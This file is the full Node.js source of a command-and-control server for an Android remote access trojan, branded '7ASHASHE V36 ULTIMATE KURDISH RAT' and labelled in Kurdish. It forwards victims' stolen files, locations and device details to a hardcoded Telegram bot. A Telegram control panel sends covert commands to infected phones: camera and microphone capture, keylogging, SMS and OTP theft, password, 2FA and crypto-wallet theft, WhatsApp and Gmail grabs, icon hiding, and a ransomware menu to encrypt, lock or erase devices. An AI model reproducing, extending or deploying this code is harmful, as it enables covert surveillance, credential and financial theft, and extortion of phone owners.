// =====================================================
// 7ASHASHE V36 - ULTIMATE KURDISH RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 36.0.0 - WILD REFACTORED
// توکن: 8530600841:AAEIQVf8T2FGChuOfUQH0dmv7ejY-DkquOk
// چات ئایدی: 5578405082
// =====================================================

const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

// =====================================================
// 🔐 CREDENTIALS - 7ASHASHE
// =====================================================
const CONFIG = {
    TOKEN: '8530600841:AAEIQVf8T2FGChuOfUQH0dmv7ejY-DkquOk',
    CHAT_ID: '5578405082',
    MASTER: '7ASHASHE',
    VERSION: '36.0.0',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
    PORT: process.env.PORT || 8999,
    MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
    PING_INTERVAL: 30000, // 30 seconds
    RECONNECT_TIMEOUT: 5000 // 5 seconds
};

// =====================================================
// 📁 DIRECTORY STRUCTURE
// =====================================================
const DIRS = {
    DATA: path.join(__dirname, 'data'),
    PHOTOS: path.join(__dirname, 'data', 'photos'),
    VIDEOS: path.join(__dirname, 'data', 'videos'),
    AUDIO: path.join(__dirname, 'data', 'audio'),
    FILES: path.join(__dirname, 'data', 'files'),
    CONTACTS: path.join(__dirname, 'data', 'contacts'),
    SMS: path.join(__dirname, 'data', 'sms'),
    CALLS: path.join(__dirname, 'data', 'calls'),
    APPS: path.join(__dirname, 'data', 'apps'),
    KEYLOGS: path.join(__dirname, 'data', 'keylogs'),
    CLIPBOARD: path.join(__dirname, 'data', 'clipboard'),
    LOCATION: path.join(__dirname, 'data', 'location'),
    SCREENSHOTS: path.join(__dirname, 'data', 'screenshots'),
    SCREEN_RECORDS: path.join(__dirname, 'data', 'screen_records'),
    WHATSAPP: path.join(__dirname, 'data', 'whatsapp'),
    TELEGRAM: path.join(__dirname, 'data', 'telegram'),
    INSTAGRAM: path.join(__dirname, 'data', 'instagram'),
    FACEBOOK: path.join(__dirname, 'data', 'facebook'),
    GMAIL: path.join(__dirname, 'data', 'gmail'),
    PASSWORDS: path.join(__dirname, 'data', 'passwords'),
    CRYPTO: path.join(__dirname, 'data', 'crypto'),
    TWOFA: path.join(__dirname, 'data', '2fa'),
    RANSOMWARE: path.join(__dirname, 'data', 'ransomware'),
    DROPPER: path.join(__dirname, 'data', 'dropper'),
    LOGS: path.join(__dirname, 'data', 'logs'),
    DATABASE: path.join(__dirname, 'data', 'database.json')
};

// Create all directories
Object.values(DIRS).forEach(dir => {
    if (!dir.includes('.json') && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    }
});

// Initialize database
if (!fs.existsSync(DIRS.DATABASE)) {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify({
        clients: {},
        stats: {
            total_connections: 0,
            total_files: 0,
            total_commands: 0,
            start_time: new Date().toISOString()
        }
    }, null, 2));
}

// =====================================================
// 🔧 UTILITY FUNCTIONS
// =====================================================
const readDB = () => {
    try {
        return JSON.parse(fs.readFileSync(DIRS.DATABASE, 'utf8'));
    } catch (e) {
        return { clients: {}, stats: {} };
    }
};

const writeDB = (data) => {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify(data, null, 2));
};

const encrypt = (data) => {
    const cipher = crypto.createCipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted) => {
    const decipher = crypto.createDecipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
};

const obfuscate = (code) => {
    // Simple obfuscation for demo purposes
    return Buffer.from(code).toString('base64');
};

const deobfuscate = (obfuscated) => {
    return Buffer.from(obfuscated, 'base64').toString('utf8');
};

const logToFile = (type, data) => {
    const logFile = path.join(DIRS.LOGS, `${type}_${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
};

const getSystemInfo = () => ({
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    memory: {
        total: os.totalmem(),
        free: os.freemem(),
        usage: ((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2) + '%'
    },
    uptime: os.uptime(),
    loadavg: os.loadavg()
});

// =====================================================
// 🚀 SERVER SETUP
// =====================================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
const upload = multer({ 
    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
    storage: multer.memoryStorage()
});

// Store connected clients
const clients = new Map();

// Middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Powered-By', '7ASHASHE');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

// =====================================================
// 🏠 WEB INTERFACE
// =====================================================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ckb">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>7ASHASHE V36 - ULTIMATE KURDISH RAT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    background-image: 
                        linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent);
                    background-size: 50px 50px;
                }
                .container { max-width: 1200px; margin: 0 auto; }
                .header {
                    border: 3px solid #0f0;
                    padding: 30px;
                    margin-bottom: 30px;
                    background: #111;
                    box-shadow: 0 0 50px rgba(0,255,0,0.3);
                    text-align: center;
                }
                .header h1 {
                    font-size: 4em;
                    text-shadow: 0 0 20px #0f0;
                    animation: glitch 3s infinite;
                }
                @keyframes glitch {
                    0%,100% { text-shadow: 0 0 20px #0f0; }
                    25% { text-shadow: -5px 0 #f00, 5px 0 #00f; }
                    75% { text-shadow: 5px 0 #f00, -5px 0 #00f; }
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    border: 2px solid #0f0;
                    padding: 20px;
                    text-align: center;
                    background: #111;
                }
                .stat-value { font-size: 3em; font-weight: bold; }
                .footer {
                    text-align: center;
                    margin-top: 50px;
                    padding: 20px;
                    border-top: 2px solid #0f0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 7ASHASHE V36</h1>
                    <p>ULTIMATE KURDISH RAT</p>
                    <p>👑 Master: ${CONFIG.MASTER}</p>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-value" id="clientCount">${clients.size}</div>
                        <div>ئامێرە پەیوەستکراوەکان</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="uptime">0</div>
                        <div>ماوەی کارکردن</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="commandCount">0</div>
                        <div>فەرمانەکان</div>
                    </div>
                </div>
                
                <div class="footer">
                    <p>7ASHASHE V36 - ULTIMATE KURDISH RAT</p>
                    <p>🦁 💀 🔥</p>
                </div>
            </div>
            
            <script>
                let startTime = Date.now();
                let commandCount = 0;
                
                setInterval(() => {
                    const uptime = Math.floor((Date.now() - startTime) / 1000);
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = uptime % 60;
                    document.getElementById('uptime').textContent = 
                        hours + ':' + minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
                }, 1000);
                
                setInterval(() => {
                    fetch('/api/stats')
                        .then(r => r.json())
                        .then(data => {
                            document.getElementById('clientCount').textContent = data.clients;
                        });
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// =====================================================
// 📊 API ENDPOINTS
// =====================================================
app.get('/api/stats', (req, res) => {
    res.json({
        clients: clients.size,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: CONFIG.VERSION
    });
});

// =====================================================
// 📤 FILE UPLOAD ENDPOINTS
// =====================================================
app.post('/upload/file', upload.single('file'), (req, res) => {
    try {
        const { model, uuid, type, path: filePath } = req.headers;
        const { originalname, buffer, size } = req.file;
        
        const fileName = `${Date.now()}_${originalname}`;
        let saveDir = DIRS.FILES;
        
        switch(type) {
            case 'photo': saveDir = DIRS.PHOTOS; break;
            case 'video': saveDir = DIRS.VIDEOS; break;
            case 'audio': saveDir = DIRS.AUDIO; break;
            default: saveDir = DIRS.FILES;
        }
        
        const savePath = path.join(saveDir, fileName);
        fs.writeFileSync(savePath, buffer);
        
        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
            caption: `📁 **فایلی نوێ**\n\n` +
                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
                    `📄 ناو: ${originalname}\n` +
                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
                    `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...\n` +
                    `🔒 Encrypted: ✅`,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true, fileName });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upload/text', (req, res) => {
    const { model, uuid, type } = req.headers;
    const { text } = req.body;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
        `${text}\n\n` +
        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

app.post('/upload/location', (req, res) => {
    const { model, uuid } = req.headers;
    const { lat, lon } = req.body;
    
    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
    bot.sendMessage(CONFIG.CHAT_ID,
        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🔌 WEBSOCKET CONNECTION
// =====================================================
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        model: req.headers.model || 'نەزانراو',
        manufacturer: req.headers.manufacturer || 'نەزانراو',
        androidVersion: req.headers.android || 'نەزانراو',
        battery: req.headers.battery || 'نەزانراو',
        ram: req.headers.ram || 'نەزانراو',
        storage: req.headers.storage || 'نەزانراو',
        root: req.headers.root || 'نەزانراو',
        miui: req.headers.miui || 'نەزانراو',
        country: req.headers.country || 'نەزانراو',
        carrier: req.headers.carrier || 'نەزانراو',
        networkType: req.headers.network || 'نەزانراو'
    };
    
    clients.set(clientId, { ws, info: clientInfo });
    
    // Update database
    const db = readDB();
    db.clients[clientId] = clientInfo;
    db.stats.total_connections++;
    writeDB(db);
    
    // Notify master
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
        `🔋 **پاتری:** ${clientInfo.battery}\n` +
        `💾 **RAM:** ${clientInfo.ram}\n` +
        `📁 **Storage:** ${clientInfo.storage}\n` +
        `🔓 **Root:** ${clientInfo.root}\n` +
        `🔥 **MIUI Bypass:** ${clientInfo.miui}\n` +
        `🌍 **وڵات:** ${clientInfo.country}\n` +
        `📡 **کەریەر:** ${clientInfo.carrier}\n` +
        `🌐 **IP:** ${clientInfo.ip}\n` +
        `🆔 **ID:** ${clientId.substring(0, 8)}...\n` +
        `🔒 **Encrypted:** ✅`,
        { parse_mode: 'Markdown' }
    );
    
    // Handle messages
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            clientInfo.lastSeen = new Date().toISOString();
            
            switch(message.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'data':
                    // Handle different data types
                    const { dataType, content } = message;
                    logToFile(dataType, { clientId, content });
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    // Handle close
    ws.on('close', () => {
        clients.delete(clientId);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
            `🆔 ID: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    });
    
    // Send initial command
    ws.send(JSON.stringify({ type: 'init', clientId }));
});

// =====================================================
// 🤖 TELEGRAM BOT - MAIN CONTROLLER
// =====================================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔴 **7ASHASHE V36 - ULTIMATE KURDISH RAT**\n\n' +
        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان',
        {
            reply_markup: {
                keyboard: [
                    ['📱 ئامێرەکان', '📊 ئامار'],
                    ['⚡ فەرمانەکان']
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/📱 ئامێرەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    let text = '📱 **ئامێرە پەیوەستکراوەکان**\n\n';
    clients.forEach((client, id) => {
        text += `📱 **مۆدێل:** ${client.info.manufacturer} ${client.info.model}\n` +
                `📱 **ئەندرۆید:** ${client.info.androidVersion}\n` +
                `🔋 **پاتری:** ${client.info.battery}\n` +
                `🌍 **وڵات:** ${client.info.country}\n` +
                `🕐 **دوایین بینین:** ${new Date(client.info.lastSeen).toLocaleTimeString()}\n` +
                `🆔 **ID:** ${id.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/📊 ئامار/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const stats = {
        clients: clients.size,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: CONFIG.VERSION,
        node: process.version,
        platform: os.platform()
    };
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📊 **ئامارەکانی سیستەم**\n\n` +
        `📱 **ئامێرە پەیوەستکراوەکان:** ${stats.clients}\n` +
        `⏱️ **ماوەی کارکردن:** ${Math.floor(stats.uptime / 3600)}:${Math.floor((stats.uptime % 3600) / 60)}:${Math.floor(stats.uptime % 60)}\n` +
        `📦 **وەشان:** ${stats.version}\n` +
        `🖥️ **Node.js:** ${stats.node}\n` +
        `💻 **پلاتفۆرم:** ${stats.platform}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/⚡ فەرمانەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model} - ${client.info.battery}`,
            callback_data: `device:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// =====================================================
// 🔘 INLINE KEYBOARD HANDLERS
// =====================================================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, clientId] = callbackQuery.data.split(':');
    
    if (command === 'device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            });
            return;
        }
        
        bot.editMessageText(
            `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
            `📱 **ئەندرۆید:** ${client.info.androidVersion}\n` +
            `🔋 **پاتری:** ${client.info.battery}\n` +
            `💾 **RAM:** ${client.info.ram}\n` +
            `📁 **Storage:** ${client.info.storage}\n` +
            `🔓 **Root:** ${client.info.root}\n` +
            `🌍 **وڵات:** ${client.info.country}\n` +
            `📡 **کەریەر:** ${client.info.carrier}\n` +
            `🌐 **IP:** ${client.info.ip}\n` +
            `🕐 **پەیوەست بوو:** ${new Date(client.info.connectedAt).toLocaleString()}\n\n` +
            `**⚡ فەرمانێک هەڵبژێرە:**`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        // Camera & Video
                        [
                            { text: '📸 وێنەی پشت', callback_data: `camera_back:${clientId}` },
                            { text: '🤳 وێنەی پێش', callback_data: `camera_front:${clientId}` }
                        ],
                        [
                            { text: '📹 ڤیدیۆی پشت', callback_data: `video_back:${clientId}` },
                            { text: '🎥 ڤیدیۆی پێش', callback_data: `video_front:${clientId}` }
                        ],
                        [
                            { text: '📸 دزینی هەموو وێنەکان', callback_data: `get_photos:${clientId}` },
                            { text: '📹 دزینی هەموو ڤیدیۆکان', callback_data: `get_videos:${clientId}` }
                        ],
                        
                        // Screen
                        [
                            { text: '📸 سکرین شۆت', callback_data: `screenshot:${clientId}` },
                            { text: '📹 تۆماری شاشە', callback_data: `screen_record:${clientId}` }
                        ],
                        
                        // Audio
                        [
                            { text: '🎤 تۆماری دەنگ', callback_data: `microphone:${clientId}` },
                            { text: '📞 تۆماری پەیوەندی', callback_data: `call_record:${clientId}` }
                        ],
                        
                        // Data Extraction
                        [
                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` },
                            { text: '📋 کلیپبۆرد', callback_data: `clipboard:${clientId}` }
                        ],
                        [
                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
                            { text: '👥 کۆنتاکتەکان', callback_data: `contacts:${clientId}` }
                        ],
                        [
                            { text: '📞 پەیوەندییەکان', callback_data: `calls:${clientId}` },
                            { text: '📨 SMS', callback_data: `sms:${clientId}` }
                        ],
                        [
                            { text: '🔐 OTP', callback_data: `otp:${clientId}` },
                            { text: '📤 ناردنی SMS', callback_data: `send_sms:${clientId}` }
                        ],
                        
                        // Apps & Passwords
                        [
                            { text: '📱 ئەپەکان', callback_data: `apps:${clientId}` },
                            { text: '🔑 پاسۆردەکان', callback_data: `passwords:${clientId}` }
                        ],
                        [
                            { text: '🔐 2FA', callback_data: `twofa:${clientId}` },
                            { text: '📧 Gmail', callback_data: `gmail:${clientId}` }
                        ],
                        [
                            { text: '💬 WhatsApp', callback_data: `whatsapp:${clientId}` },
                            { text: '✈️ Telegram', callback_data: `telegram:${clientId}` }
                        ],
                        
                        // Crypto & Ransomware
                        [
                            { text: '💳 Crypto', callback_data: `crypto:${clientId}` },
                            { text: '💣 ڕانسۆمویر', callback_data: `ransomware:${clientId}` }
                        ],
                        
                        // File System
                        [
                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` },
                            { text: '📂 وەرگرتنی فایل', callback_data: `download_file:${clientId}` }
                        ],
                        
                        // Control
                        [
                            { text: '🔓 Admin', callback_data: `admin:${clientId}` },
                            { text: '❄️ Freeze', callback_data: `freeze:${clientId}` }
                        ],
                        [
                            { text: '🚫 Hide Icon', callback_data: `hide_icon:${clientId}` },
                            { text: '🔄 Update', callback_data: `update:${clientId}` }
                        ],
                        [
                            { text: 'ℹ️ Info', callback_data: `info:${clientId}` },
                            { text: '🗑️ Erase', callback_data: `erase:${clientId}` }
                        ]
                    ]
                },
                parse_mode: 'Markdown'
            }
        );
    }
    
    // Execute commands
    const commandTypes = [
        'camera_back', 'camera_front', 'video_back', 'video_front',
        'screenshot', 'screen_record', 'microphone', 'call_record',
        'keylogger', 'clipboard', 'location', 'contacts', 'calls',
        'sms', 'otp', 'apps', 'passwords', 'twofa', 'gmail',
        'whatsapp', 'telegram', 'crypto', 'files', 'admin',
        'freeze', 'hide_icon', 'info', 'erase'
    ];
    
    if (commandTypes.includes(command)) {
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ فەرمان نێردرا',
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **فەرمان نێردرا**\n\n` +
                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
                `⚡ فەرمان: ${command}\n` +
                `🕐 کات: ${new Date().toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                show_alert: true
            });
        }
    }
    
    // Special commands that need input
    if (command === 'get_photos') {
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'get_photos',
                paths: ['DCIM/Camera', 'Pictures', 'Download'],
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '📸 دزینی وێنەکان دەستی پێکرد',
                show_alert: false
            });
        }
    }
    
    if (command === 'get_videos') {
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'get_videos',
                paths: ['DCIM/Camera', 'Movies', 'Download'],
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '📹 دزینی ڤیدیۆکان دەستی پێکرد',
                show_alert: false
            });
        }
    }
    
    if (command === 'ransomware') {
        bot.deleteMessage(CONFIG.CHAT_ID, msg.message_id);
        bot.sendMessage(CONFIG.CHAT_ID,
            '💣 **ڕانسۆمویر**\n\n' +
            '1. 💣 Encrypt Files - کۆدکردنی فایلەکان\n' +
            '2. 📝 Ransom Note - دانانی پەیامی ڕانسۆمویر\n' +
            '3. 🔐 Lock Device - قوفڵکردنی ئامێر\n' +
            '4. 🗑️ Erase Device - سڕینەوەی هەموو داتاکان\n\n' +
            'ژمارە بنووسە (1-4):',
            { reply_markup: { force_reply: true } }
        );
    }
    
    if (command === 'send_sms') {
        bot.deleteMessage(CONFIG.CHAT_ID, msg.message_id);
        bot.sendMessage(CONFIG.CHAT_ID,
            '📞 **ژمارە تەلەفۆن بنووسە**\n\n' +
            'نموونە: 964**********',
            { reply_markup: { force_reply: true } }
        );
    }
});

// =====================================================
// 💣 RANSOMWARE MODULE
// =====================================================
bot.onText(/^[1-4]$/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const choice = parseInt(msg.text);
    const ransomwareMessages = {
        1: '💣 کۆدکردنی فایلەکان دەستی پێکرد...',
        2: '📝 تکایە پەیامی ڕانسۆمویر بنووسە:',
        3: '🔐 قوفڵکردنی ئامێر...',
        4: '🗑️ سڕینەوەی هەموو داتاکان...'
    };
    
    bot.sendMessage(CONFIG.CHAT_ID, ransomwareMessages[choice]);
});

// =====================================================
// 🔄 PING & KEEP ALIVE
// =====================================================
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    });
    
    // Keep Railway alive
    axios.get(`https://${process.env.RAILWAY_STATIC_URL || 'localhost'}`).catch(() => {});
}, CONFIG.PING_INTERVAL);

// =====================================================
// 🚀 START SERVER
// =====================================================
server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V36 running on port ${CONFIG.PORT}`);
    console.log(`🌐 http://localhost:${CONFIG.PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - ${CONFIG.MASTER}`);
    console.log(`🔒 Encryption: AES-256-CBC`);
    console.log(`📁 Data directory: ${DIRS.DATA}`);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔥 **7ASHASHE V36 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **Master: ${CONFIG.MASTER}**\n` +
        `📊 وەشان: ${CONFIG.VERSION}\n` +
        `🌐 پۆرت: ${CONFIG.PORT}\n` +
        `🖥️ Platform: ${os.platform()}\n` +
        `⏱️ Start Time: ${new Date().toLocaleString()}\n\n` +
        `✅ **تایبەتمەندییەکان:**\n` +
        `• دزینی وێنە و ڤیدیۆ و دەنگ\n` +
        `• کۆنترۆڵی کامێرا و مایکرۆفۆن\n` +
        `• کێڤلۆگەر و کلیپبۆرد\n` +
        `• دزینی کۆنتاکت و SMS و پەیوەندی\n` +
        `• دزینی پاسۆرد و 2FA\n` +
        `• دزینی ئەپەکانی سۆشیاڵ میدیا\n` +
        `• ڕانسۆمویر\n` +
        `• پەیوەندی ئینکریپتکراو\n` +
        `• Anti-Detection\n\n` +
        `🦁 **7ASHASHE**`
    );
});

// =====================================================
// 🛡️ ERROR HANDLING
// =====================================================
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    bot.sendMessage(CONFIG.CHAT_ID,
        `⚠️ **Uncaught Exception**\n\n${error.message}`,
        { parse_mode: 'Markdown' }
    );
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
    bot.sendMessage(CONFIG.CHAT_ID,
        `⚠️ **Unhandled Rejection**\n\n${reason}`,
        { parse_mode: 'Markdown' }
    );
});

// =====================================================
// 📁 PACKAGE.JSON
// =====================================================
/*
{
  "name": "7ashashe-v36",
  "version": "36.0.0",
  "description": "7ASHASHE ULTIMATE KURDISH RAT",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "ws": "^8.14.2",
    "node-telegram-bot-api": "^0.64.0",
    "uuid": "^9.0.1",
    "multer": "^1.4.5-lts.1",
    "body-parser": "^1.20.2",
    "axios": "^1.6.2"
  }
}
*/
